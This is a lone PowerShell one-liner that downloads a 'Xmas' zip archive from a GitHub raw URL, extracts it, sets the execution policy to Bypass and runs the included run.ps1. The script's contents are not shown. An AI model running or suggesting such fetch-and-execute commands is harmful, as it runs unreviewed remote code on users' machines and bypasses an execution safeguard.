$url="https://raw.githubusercontent.com/Mai-x00/Scripts-public/refs/heads/main/Xmas/xmas.zip"; $t = New-TemporaryFile; rni $t.FullName "$($t.FullName).zip" -PassThru; iwr $url -OutFile "$($t.FullName).zip"; Expand-Archive "$($t.FullName).zip" -DestinationPath $t.FullName; Set-ExecutionPolicy Bypass CurrentUser -Force; cd $t.FullName; .\run.ps1
